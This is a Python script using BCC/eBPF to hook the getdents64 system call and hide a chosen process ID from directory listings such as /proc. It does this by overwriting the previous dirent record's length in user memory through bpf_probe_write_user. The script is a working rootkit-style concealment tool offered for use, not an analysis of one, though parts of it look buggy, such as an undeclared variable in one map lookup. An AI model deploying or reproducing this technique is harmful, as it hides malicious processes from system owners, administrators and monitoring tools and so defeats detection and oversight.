from bcc import BPF
from ctypes import *
import argparse
import sys

bpf_text = """
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>
#include "dirent.h"


struct getdents64 {
    u64 __unused__;
    u32 __unused2__;
    u64 fd;
    u64 dirent;
    u64 count;
};

struct getdents64_exit {
    u64 __unused__;
    u32 __unused2__;
    u64 ret;
};

/*  TODO - Will be used when moving to BPF_PERF_OUTPUT
struct data_event {
    int res;
    u32 pid;
    u64 ts;
    char comm[64];
    char buffer[100];
};*/

struct input_struct {
    char val[32];
};

BPF_HASH(dirs, u64, struct linux_dirent64 *);
BPF_HASH(pid, u64, char);
BPF_HASH(input, u32, struct input_struct);
BPF_HASH(all, u32, u32);

//TODO - Modify the program to use "BPF_PERF_OUTPUT" instead of "trace_fields"
//BPF_PERF_OUTPUT(events);

static int local_strcmp(const char *cs, const char *ct, int size){
  int len = 0;
  unsigned char c1, c2;

  while (len++ < size){
    c1 = *cs++;
    c2 = *ct++;

    if (c1 != c2)
        return c1 < c2 ? -1 : 1;

    if (!c1)
        break;
  }

  return 0;
}


int enter_dir(struct getdents64 *args){

    u64 tid = bpf_get_current_pid_tgid();
    struct linux_dirent64 *d_entries = (struct linux_dirent64 *) args->dirent;

    if(d_entries == NULL){
        return 0;
    }
    dirs.update(&tid, &d_entries);
    return 0;
}

int exit_dir(struct getdents64_exit *args) {

    // Get current tid
    u64 tid = bpf_get_current_pid_tgid();
    if ((void *)tid == NULL ){
        return 0;
    }

    // Get parent pid
    struct task_struct *task;
    task = (struct task_struct *)bpf_get_current_task();
    u64 ppid = task->real_parent->tgid;
    //bpf_trace_printk("Parent PID: %d\\n", ppid);


    long unsigned int * dir_addr = (long unsigned int *) dirs.lookup(&tid);
    if(dir_addr == NULL){
        return 0;
    }

    char *p = NULL;
    char pid_[8];
    memset(pid_, 0, sizeof(pid_));
    p = pid.lookup(&tid);


    if(p){
       //bpf_trace_printk("Hooked Pid: %d\\n", p);
    }
    else if(pid.lookup(&ppid)){
       //bpf_trace_printk("Hooked because I'm the child of: %d\\n", ppid);
    }
    else if(all.lookup(&k)){
       //bpf_trace_printk("Hooking all pids!\\n");
    }
    else {
       dirs.delete(&tid);
       return 0;
    }

    char proc_name[32];
    bpf_get_current_comm(&proc_name, sizeof(proc_name));

    dirs.delete(&tid);

    //struct data_event event = {};
    //bpf_get_current_comm(&event.comm, sizeof(event.comm));
    //event.pid = bpf_get_current_pid_tgid();
    //event.ts = bpf_ktime_get_ns();


    struct linux_dirent64 * d_entry, * prev_d_entry = NULL;
    unsigned short int d_reclen, prev_d_reclen=0;
    unsigned short int d_name_len;
    long offset = 0;

    long unsigned int d_entry_base_addr = *dir_addr;
    long ret = args->ret;

    int i=0;
    while (i < 1024) {
        //bpf_trace_printk("Loop %d: offset: %d, total len: %d", i, offset, ret);

        if (offset >= ret){
            break;
        }

    // read d_entry
    d_entry = (struct linux_dirent64 *) (d_entry_base_addr + offset);

    // read d_reclen
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &d_entry->d_reclen);

    //read d_name
    char d_name[64];
    d_name_len = d_reclen - 2 - (offsetof(struct linux_dirent64, d_name));
    long success = bpf_probe_read_user(&d_name, 64, d_entry->d_name);
    if ( success != 0 )
    {
        offset += d_reclen;
        i++;
        continue;
    }

    char hide[16];
    memset(hide, 0, sizeof(hide));
    u32 key = 0;
    struct input_struct *in = input.lookup(&key);
    int size = 0;
    if(in){
       //bpf_trace_printk("Input: %s", in->val);
       size = bpf_probe_read_str(&hide, sizeof(hide), &in->val);
    }


    //if (__builtin_memcmp(hide, d_name, sizeof(hide)) == 0){
    if(local_strcmp(hide, d_name, sizeof(hide)) == 0){
        bpf_probe_read_user(&prev_d_reclen, sizeof(prev_d_reclen), &prev_d_entry->d_reclen);
        prev_d_reclen += d_reclen;
        int success = bpf_probe_write_user( &prev_d_entry->d_reclen, &prev_d_reclen, sizeof(prev_d_reclen));
        if(success){
           bpf_trace_printk("Error in write!");
        }
        else{
           bpf_trace_printk("Hiding PID for proc '%s' (%d)", proc_name, tid);
        }
    }

    offset += d_reclen;
    i++;
    prev_d_entry = d_entry;
    }

    //events.perf_submit(ctx, &event, sizeof(event));

    return 0;
}
"""


class MyStruct(Structure):
    _fields_ = [("val", c_char * 32)]


# Parse arguments
parser = argparse.ArgumentParser(
    description='Hide the specified PID by overwriting "linux_dirent64" struct when "getdents64" is called by userspace process.')
parser.add_argument('--pids', type=int, nargs='+',
                    help='Hide only to specified PIDs')
parser.add_argument('pid', help='PID to hide')
args = parser.parse_args()


# load eBPF program
b = BPF(text=bpf_text)


# Populate the PID map with input PIDs
pid = b["pid"]
if(args.pids is not None):
    print("[+] Attacching to PIDs: ", args.pids)
    for p in args.pids:
        b_string = create_string_buffer(bytes(str(p), 'utf-8'))
        pid[c_int(p)] = b_string
else:
    print("[+] Attaching to all processes")
    all_map = b["all"]
    all_map[c_int(1)] = c_int(1)


# Populate the "input" map with input
inp = b["input"]
myStruct = MyStruct()
myStruct.val = bytes(args.pid, 'utf-8')
inp[c_int(0)] = myStruct
print(f"[+] Starting hiding PID {args.pid}")


# Attach to getdents64 (enter and exit) tracepoints
b.attach_tracepoint(tp="syscalls:sys_enter_getdents64", fn_name="enter_dir")
b.attach_tracepoint(tp="syscalls:sys_exit_getdents64", fn_name="exit_dir")


# header
print("%-18s %-16s %-6s %s" % ("TIME(s)", "COMM", "PID", "ENTRY"))

# format output
while 1:
    try:
        (task, pid, cpu, flags, ts, msg) = b.trace_fields()
    except ValueError:
        continue
    except KeyboardInterrupt:
        print("\n[+] Ctrl-c received, exiting..")
        sys.exit(0)
    if(task == b'top'):
        print("%-18.9f %-16s %-6d %s" % (ts, task, pid, msg))
